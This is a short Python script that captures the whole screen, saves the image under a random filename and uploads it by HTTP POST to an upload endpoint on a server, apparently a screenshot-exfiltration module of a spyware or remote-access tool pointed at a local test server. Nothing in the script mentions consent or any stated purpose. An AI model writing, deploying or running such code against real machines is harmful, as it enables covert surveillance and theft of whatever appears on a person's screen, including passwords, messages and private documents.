import requests
from PIL import ImageGrab
import uuid

SERVER_URL = "http://localhost:5000"
UPLOAD_ENDPOINT = "/upload"
uuid = uuid.uuid4()

def run():
    # Take screenshot
    screenshot = ImageGrab.grab()
    screenshot.save(f"screenshot{uuid}.png")
    screenshot.close()

    # Upload screenshot
    try:
        with open(f"screenshot{uuid}.png", "rb") as file:
            files = {"file": file}
            response = requests.post(SERVER_URL + UPLOAD_ENDPOINT, files=files)
            print(response.status_code, response.text)

    except Exception as e:
        print(f"[!] Upload error: {e}")